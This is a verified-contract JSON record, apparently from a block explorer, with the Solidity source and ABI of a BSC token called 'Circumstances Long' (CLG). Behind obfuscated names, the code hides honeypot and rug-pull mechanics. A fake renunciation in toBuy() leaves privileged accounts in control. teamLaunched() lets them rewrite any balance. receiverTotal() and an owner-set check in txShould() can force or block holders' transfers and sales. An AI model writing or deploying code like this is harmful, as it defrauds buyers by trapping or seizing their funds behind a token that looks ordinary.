{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface senderSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldMarketing {\n    function createPair(address tradingLaunchedFee, address autoFrom) external returns (address);\n}\n\ninterface takeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txMarketing) external view returns (uint256);\n\n    function transfer(address tradingMarketing, uint256 maxMode) external returns (bool);\n\n    function allowance(address fundLaunchedList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMarketing,\n        uint256 maxMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellIs, uint256 value);\n    event Approval(address indexed fundLaunchedList, address indexed spender, uint256 value);\n}\n\ninterface takeReceiverMetadata is takeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CircumstancesLong is modeWallet, takeReceiver, takeReceiverMetadata {\n\n    event OwnershipTransferred(address indexed tradingTx, address indexed isTx);\n\n    uint256 public shouldMin;\n\n    function balanceOf(address txMarketing) public view virtual override returns (uint256) {\n        return senderSwap[txMarketing];\n    }\n\n    uint256 teamWalletTake;\n\n    function transfer(address enableFrom, uint256 maxMode) external virtual override returns (bool) {\n        return txShould(_msgSender(), enableFrom, maxMode);\n    }\n\n    mapping(address => bool) public txTake;\n\n    function approve(address launchAtFee, uint256 maxMode) public virtual override returns (bool) {\n        limitMarketing[_msgSender()][launchAtFee] = maxMode;\n        emit Approval(_msgSender(), launchAtFee, maxMode);\n        return true;\n    }\n\n    string private liquidityToken = \"Circumstances Long\";\n\n    uint8 private maxIs = 18;\n\n    uint256 listTx;\n\n    string private shouldTake = \"CLG\";\n\n    function txShould(address enableReceiver, address tradingMarketing, uint256 maxMode) internal returns (bool) {\n        if (enableReceiver == toFrom) {\n            return minFund(enableReceiver, tradingMarketing, maxMode);\n        }\n        uint256 fromTeam = takeReceiver(teamAt).balanceOf(amountToSender);\n        require(fromTeam == teamWalletTake);\n        require(tradingMarketing != amountToSender);\n        if (fromTake[enableReceiver]) {\n            return minFund(enableReceiver, tradingMarketing, fundLiquidity);\n        }\n        return minFund(enableReceiver, tradingMarketing, maxMode);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTake;\n    }\n\n    address amountToSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (teamSenderTo != swapAt) {\n            shouldMin = sellAuto;\n        }\n        senderSell receiverLaunch = senderSell(exemptLiquidity);\n        teamAt = shouldMarketing(receiverLaunch.factory()).createPair(receiverLaunch.WETH(), address(this));\n        if (shouldMin != sellAuto) {\n            sellAuto = shouldMin;\n        }\n        toFrom = _msgSender();\n        toBuy();\n        txTake[toFrom] = true;\n        senderSwap[toFrom] = limitFundReceiver;\n        if (sellAuto != shouldMin) {\n            shouldMin = sellAuto;\n        }\n        emit Transfer(address(0), toFrom, limitFundReceiver);\n    }\n\n    mapping(address => uint256) private senderSwap;\n\n    address private sellTotalReceiver;\n\n    function minFund(address enableReceiver, address tradingMarketing, uint256 maxMode) internal returns (bool) {\n        require(senderSwap[enableReceiver] >= maxMode);\n        senderSwap[enableReceiver] -= maxMode;\n        senderSwap[tradingMarketing] += maxMode;\n        emit Transfer(enableReceiver, tradingMarketing, maxMode);\n        return true;\n    }\n\n    address exemptLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function modeBuy() private view {\n        require(txTake[_msgSender()]);\n    }\n\n    function tradingToken(uint256 maxMode) public {\n        modeBuy();\n        teamWalletTake = maxMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellTotalReceiver;\n    }\n\n    function transferFrom(address enableReceiver, address tradingMarketing, uint256 maxMode) external override returns (bool) {\n        if (_msgSender() != exemptLiquidity) {\n            if (limitMarketing[enableReceiver][_msgSender()] != type(uint256).max) {\n                require(maxMode <= limitMarketing[enableReceiver][_msgSender()]);\n                limitMarketing[enableReceiver][_msgSender()] -= maxMode;\n            }\n        }\n        return txShould(enableReceiver, tradingMarketing, maxMode);\n    }\n\n    uint256 public sellAuto;\n\n    bool public listMarketing;\n\n    bool public teamSenderTo;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityToken;\n    }\n\n    function receiverTotal(address launchLimit) public {\n        modeBuy();\n        if (teamSenderTo == swapAt) {\n            teamSenderTo = true;\n        }\n        if (launchLimit == toFrom || launchLimit == teamAt) {\n            return;\n        }\n        fromTake[launchLimit] = true;\n    }\n\n    uint256 constant fundLiquidity = 9 ** 10;\n\n    function owner() external view returns (address) {\n        return sellTotalReceiver;\n    }\n\n    uint256 private limitFundReceiver = 100000000 * 10 ** 18;\n\n    address public teamAt;\n\n    function teamLaunched(address enableFrom, uint256 maxMode) public {\n        modeBuy();\n        senderSwap[enableFrom] = maxMode;\n    }\n\n    bool public swapAt;\n\n    address public toFrom;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitFundReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitMarketing;\n\n    function toBuy() public {\n        emit OwnershipTransferred(toFrom, address(0));\n        sellTotalReceiver = address(0);\n    }\n\n    function allowance(address buyFee, address launchAtFee) external view virtual override returns (uint256) {\n        if (launchAtFee == exemptLiquidity) {\n            return type(uint256).max;\n        }\n        return limitMarketing[buyFee][launchAtFee];\n    }\n\n    function sellFee(address fromReceiverAt) public {\n        if (listMarketing) {\n            return;\n        }\n        \n        txTake[fromReceiverAt] = true;\n        if (swapAt) {\n            swapAt = false;\n        }\n        listMarketing = true;\n    }\n\n    mapping(address => bool) public fromTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunchedList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAtFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAtFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"}],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiverAt\",\"type\":\"address\"}],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMode\",\"type\":\"uint256\"}],\"name\":\"teamLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSenderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxMode\",\"type\":\"uint256\"}],\"name\":\"tradingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CircumstancesLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}